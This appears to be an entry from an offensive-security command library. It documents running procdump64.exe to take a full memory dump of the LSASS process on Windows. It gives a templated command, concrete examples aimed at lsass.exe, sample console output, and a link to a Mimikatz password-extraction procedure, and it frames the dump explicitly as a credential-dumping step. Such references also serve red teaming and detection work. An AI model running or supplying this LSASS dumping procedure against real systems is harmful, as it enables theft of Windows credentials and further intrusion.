---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: procdump64-create-process-dump
type: command
executor: cmd
data: procdump64.exe -ma $_PID -accepteula $_OUTPUT_FILE
output: null
created_at: '2024-10-01T12:00:00+00:00'
updated_at: '2024-10-01T12:00:00+00:00'
platforms:
  - Windows
tags:
  - memory-dump
  - credential-access
verified: true
validated: true
---

# procdump64-create-process-dump

## Command

```cmd
procdump64.exe -ma $_PID -accepteula $_OUTPUT_FILE
```

## Description

Generates a full memory dump of a specified Windows process, such as LSASS, for offline forensic analysis or credential extraction. This is a key step in manual credential dumping when direct memory reading tools are unavailable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PID | The process ID (PID) of the target process (e.g., lsass.exe PID obtained via tasklist) | Yes |
| $_OUTPUT_FILE | Full path to the output dump file (e.g., C:\temp\lsass.dmp) | Yes |
| -ma | Creates a complete memory dump including all committed pages | Built-in |
| -accepteula | Automatically accepts the end-user license agreement | Built-in |

## Examples

### Basic Usage

```cmd
procdump64.exe -ma 988 -accepteula C:\temp\lsass.dmp
```

### Advanced Usage

```cmd
procdump64.exe -ma lsass.exe -accepteula -64 C:\dumps\full_lsass.dmp
```
(Uses process name instead of PID and forces 64-bit mode.)

## Expected Output

Console output indicating successful dump creation:

[12:34:56] Process 988 (lsass.exe) 64-bit
[12:34:56] 1234 MB of 1234 MB read
[12:34:57] Dump file written to C:\temp\lsass.dmp

The .dmp file is created at the specified path, ready for analysis.

## Related

- [[procedures/Windows-Mimikatz-RDP-Password-Extraction]]
- [[tools/ProcDump]]
